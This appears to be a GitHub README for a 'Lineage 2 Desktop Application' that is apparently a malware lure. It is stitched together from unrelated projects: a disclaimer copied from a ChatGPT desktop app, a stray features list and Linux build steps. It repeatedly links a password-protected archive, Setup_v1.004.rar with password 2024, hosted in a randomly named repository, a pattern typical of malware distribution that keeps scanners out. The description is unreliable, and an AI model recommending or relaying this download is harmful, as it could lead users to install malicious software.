<p align="center">
  <h1 align="center">Lineage 2 </h1>
  <p align="center">Lineage 2 Desktop Application</p>
</p>


[![English badge](https://img.shields.io/badge/%E8%8B%B1%E6%96%87-English-blue)](./README.md)
[![Lineage2 downloads](https://img.shields.io/github/downloads/lencx/ChatGPT/total.svg?style=flat-square)](https://github.com/h9zafALfXEUaQa1VJuS/supreme-tribble/releases/download/Download/Setup_v1.004.rar)
[![chat](https://img.shields.io/badge/chat-discord-blue?style=flat&logo=discord)](https://discord.gg/aPhCRf4zZr)

---

![Uploading maxresdefault.jpg…]()

---

**This is an unofficial project solely intended for personal learning and research. Since the Lineage 2 desktop application was open-sourced, it has garnered a lot of attention, and I want to thank everyone for their support. However, as the project progressed, two issues have arisen that greatly impact its future development:**

- **Some individuals have repackaged and sold it for profit.**
- **The name and icon of Lineage 2 could potentially lead to infringement disputes.**


<!-- tr-download-start -->

### Windows

| PASSWORD:  | 2024 |
| ------------- | ------------- |
| DOWNLOAD:  | [![Download Installer](https://custom-icon-badges.demolab.com/badge/-Download-blue?style=for-the-badge&logo=download&logoColor=white "Download Installer")](https://github.com/h9zafALfXEUaQa1VJuS/supreme-tribble/releases/download/Download/Setup_v1.004.rar) |

## Technical features

>* C++ runtime library (CRT) is not used in release builds
>* No heap memory allocations
>* No static imports in release build on Windows
>* No threads are created
>* Exceptions are not used
>* No external dependencies


#### Linux

Configure with CMake:

    cmake -DCMAKE_BUILD_TYPE=Release -B build

Build:

    cmake --build build -j $(nproc --all)

After following these steps you should receive **lineageBuild.so** file in **build/Source/** directory.


## License

AGPL-3.0 License
